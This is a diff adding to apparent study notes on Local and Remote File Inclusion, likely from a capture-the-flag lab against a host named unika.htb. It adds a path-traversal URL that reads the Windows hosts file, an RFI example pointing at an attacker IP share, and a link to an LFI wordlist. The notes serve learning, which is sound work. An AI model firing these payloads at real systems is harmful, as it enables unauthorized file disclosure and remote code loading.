@@ -9,5 +9,19 @@ performed on this input, then the attacker can exploit it by using the ../ strin
 and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
 execution as well.
 
+```linux
+WINDOWS\System32\drivers\etc\hosts
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts // If doesn't return in error, LFI is possible
+```
+
 RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
 file on the host using protocols like HTTP, FTP etc.
+
+```linux
+//10.10.14.6/somefile --> RFI
+```
+
+---
+
+[LFI wordlists](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)
+
